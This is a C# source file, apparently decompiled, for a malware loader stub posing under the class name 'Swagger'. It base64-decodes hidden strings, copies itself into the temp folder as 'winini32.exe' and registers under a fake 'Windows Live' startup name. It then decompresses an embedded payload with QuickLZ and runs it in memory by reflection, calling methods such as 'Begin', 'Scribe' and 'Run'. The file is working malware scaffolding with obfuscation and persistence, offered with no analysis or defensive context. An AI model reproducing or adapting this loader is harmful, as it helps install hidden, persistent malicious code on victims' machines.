using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Text;
using System.Threading;

internal class Swagger
{
	private static class QuickLZ
	{
		public const int QLZ_VERSION_MAJOR = 1;

		public const int QLZ_VERSION_MINOR = 5;

		public const int QLZ_VERSION_REVISION = 0;

		public const int QLZ_STREAMING_BUFFER = 0;

		public const int QLZ_MEMORY_SAFE = 0;

		private const int HASH_VALUES = 4096;

		private const int MINOFFSET = 2;

		private const int UNCONDITIONAL_MATCHLEN = 6;

		private const int UNCOMPRESSED_END = 4;

		private const int CWORD_LEN = 4;

		private const int DEFAULT_HEADERLEN = 9;

		private const int QLZ_POINTERS_1 = 1;

		private const int QLZ_POINTERS_3 = 16;

		private static int headerLen(byte[] source)
		{
			return ((source[0] & 2) == 2) ? 9 : 3;
		}

		public static int sizeDecompressed(byte[] source)
		{
			if (headerLen(source) == 9)
			{
				return source[5] | (source[6] << 8) | (source[7] << 16) | (source[8] << 24);
			}
			return source[2];
		}

		public static byte[] Decompress(byte[] source)
		{
			int num = sizeDecompressed(source);
			int num2 = headerLen(source);
			int num3 = 0;
			uint num4 = 1u;
			byte[] array = new byte[num];
			int[] array2 = new int[4096];
			byte[] array3 = new byte[4096];
			int num5 = num - 6 - 4 - 1;
			int num6 = -1;
			uint num7 = 0u;
			int num8 = (source[0] >> 2) & 3;
			if (num8 != 1 && num8 != 3)
			{
				throw new ArgumentException("C# version only supports level 1 and 3");
			}
			if ((source[0] & 1) != 1)
			{
				byte[] array4 = new byte[num];
				Array.Copy(source, headerLen(source), array4, 0, num);
				return array4;
			}
			while (true)
			{
				if (num4 == 1)
				{
					num4 = (uint)(source[num2] | (source[num2 + 1] << 8) | (source[num2 + 2] << 16) | (source[num2 + 3] << 24));
					num2 += 4;
					if (num3 <= num5)
					{
						num7 = (uint)((num8 != 1) ? (source[num2] | (source[num2 + 1] << 8) | (source[num2 + 2] << 16) | (source[num2 + 3] << 24)) : (source[num2] | (source[num2 + 1] << 8) | (source[num2 + 2] << 16)));
					}
				}
				if ((num4 & 1) == 1)
				{
					num4 >>= 1;
					uint num10;
					uint num11;
					if (num8 == 1)
					{
						int num9 = ((int)num7 >> 4) & 0xFFF;
						num10 = (uint)array2[num9];
						if ((num7 & 0xFu) != 0)
						{
							num11 = (num7 & 0xF) + 2;
							num2 += 2;
						}
						else
						{
							num11 = source[num2 + 2];
							num2 += 3;
						}
					}
					else
					{
						uint num12;
						if ((num7 & 3) == 0)
						{
							num12 = (num7 & 0xFF) >> 2;
							num11 = 3u;
							num2++;
						}
						else if ((num7 & 2) == 0)
						{
							num12 = (num7 & 0xFFFF) >> 2;
							num11 = 3u;
							num2 += 2;
						}
						else if ((num7 & 1) == 0)
						{
							num12 = (num7 & 0xFFFF) >> 6;
							num11 = ((num7 >> 2) & 0xF) + 3;
							num2 += 2;
						}
						else if ((num7 & 0x7F) != 3)
						{
							num12 = (num7 >> 7) & 0x1FFFFu;
							num11 = ((num7 >> 2) & 0x1F) + 2;
							num2 += 3;
						}
						else
						{
							num12 = num7 >> 15;
							num11 = ((num7 >> 7) & 0xFF) + 3;
							num2 += 4;
						}
						num10 = (uint)(num3 - num12);
					}
					array[num3] = array[num10];
					array[num3 + 1] = array[num10 + 1];
					array[num3 + 2] = array[num10 + 2];
					for (int i = 3; i < num11; i++)
					{
						array[num3 + i] = array[num10 + i];
					}
					num3 += (int)num11;
					if (num8 == 1)
					{
						num7 = (uint)(array[num6 + 1] | (array[num6 + 2] << 8) | (array[num6 + 3] << 16));
						while (num6 < num3 - num11)
						{
							num6++;
							int num9 = (int)(((num7 >> 12) ^ num7) & 0xFFF);
							array2[num9] = num6;
							array3[num9] = 1;
							num7 = (uint)(((num7 >> 8) & 0xFFFFu) | (array[num6 + 3] << 16));
						}
						num7 = (uint)(source[num2] | (source[num2 + 1] << 8) | (source[num2 + 2] << 16));
					}
					else
					{
						num7 = (uint)(source[num2] | (source[num2 + 1] << 8) | (source[num2 + 2] << 16) | (source[num2 + 3] << 24));
					}
					num6 = num3 - 1;
					continue;
				}
				if (num3 > num5)
				{
					break;
				}
				array[num3] = source[num2];
				num3++;
				num2++;
				num4 >>= 1;
				if (num8 == 1)
				{
					while (num6 < num3 - 3)
					{
						num6++;
						int num13 = array[num6] | (array[num6 + 1] << 8) | (array[num6 + 2] << 16);
						int num9 = ((num13 >> 12) ^ num13) & 0xFFF;
						array2[num9] = num6;
						array3[num9] = 1;
					}
					num7 = (uint)(((num7 >> 8) & 0xFFFFu) | (source[num2 + 2] << 16));
				}
				else
				{
					num7 = (uint)(((num7 >> 8) & 0xFFFFu) | (source[num2 + 2] << 16) | (source[num2 + 3] << 24));
				}
			}
			while (num3 <= num - 1)
			{
				if (num4 == 1)
				{
					num2 += 4;
					num4 = 2147483648u;
				}
				array[num3] = source[num2];
				num3++;
				num2++;
				num4 >>= 1;
			}
			return array;
		}
	}

	public static List<Thread> Threads = new List<Thread>();

	public static byte[] Running;

	public static string StartupPath = Path.GetTempPath();

	public static string StartupKey = "Windows Live Initizlizer for 32bit";

	public static string path = Process.GetCurrentProcess().MainModule!.FileName;

	private static void Main(string[] args)
	{
		Running = Dew(Decode("WmFpanouZmd0"));
		if (!(bool)Invoker(new object[3] { "Check", StartupKey, path }))
		{
			AddThread(new object[3]
			{
				"Begin",
				Decode("V2luZG93cyBMaXZlIEluaXRpemxpemVyIGZvciAzMmJpdA=="),
				Path.GetTempPath() + Decode("XFx3aW5pbmkzMi5leGU=")
			});
			AddThread(new object[6]
			{
				"Scribe",
				File.ReadAllBytes(path),
				false,
				Decode("d2luaW5pMzIuZXhl"),
				true,
				0
			});
		}
		else
		{
			AddThread(new object[1] { "SetYouFree" });
			AddThread(new object[5]
			{
				"Run",
				path,
				"",
				Dew(Decode("WXZ6aGFoLmZndA==")),
				false
			});
		}
		if (StartupKey == "")
		{
			AddThread(new object[1] { "SetYouFree" });
		}
		foreach (Thread thread in Threads)
		{
			thread.Join();
		}
	}

	private static void AddThread(object[] parameters)
	{
		Thread thread = new Thread(Invoke);
		thread.SetApartmentState(ApartmentState.STA);
		thread.Start(parameters);
		Threads.Add(thread);
	}

	private static void Invoke(object tr)
	{
		Invoker(tr);
	}

	private static object Invoker(object tr)
	{
		object[] array = (object[])tr;
		object[] array2 = new object[array.Length - 1];
		if (array.Length > 1)
		{
			Array.Copy(array, 1, array2, 0, array2.Length);
		}
		string text = (string)array[0];
		Assembly assembly = Assembly.Load(Running);
		MethodInfo[] methods = assembly.GetType("Ax")!.GetMethods();
		int num = 0;
		MethodInfo methodInfo;
		ParameterInfo[] parameters;
		while (true)
		{
			if (num < methods.Length)
			{
				methodInfo = methods[num];
				parameters = methodInfo.GetParameters();
				if (!(methodInfo.Name != text))
				{
					break;
				}
				num++;
				continue;
			}
			return null;
		}
		for (int i = 0; i < array2.Length; i++)
		{
			if ((object)parameters[i].ParameterType == array2[i].GetType())
			{
			}
		}
		return methodInfo.Invoke(null, array2);
	}

	private static byte[] ReadFully(Stream stream)
	{
		byte[] array = new byte[stream.Length];
		stream.Read(array, 0, array.Length);
		stream.Close();
		return array;
	}

	public static byte[] Dew(string rName)
	{
		List<byte> list = new List<byte>();
		for (int num = int.MaxValue; num >= 0; num--)
		{
			try
			{
				string name = rName.Replace(".fgt", "") + num + ".fgt";
				list.AddRange(ReadFully(Assembly.GetExecutingAssembly().GetManifestResourceStream(name)));
			}
			catch
			{
				break;
			}
		}
		byte[] source = list.ToArray();
		return QuickLZ.Decompress(source);
	}

	private static string Decode(string input)
	{
		return Encoding.GetEncoding(1252).GetString(Convert.FromBase64String(input));
	}
}
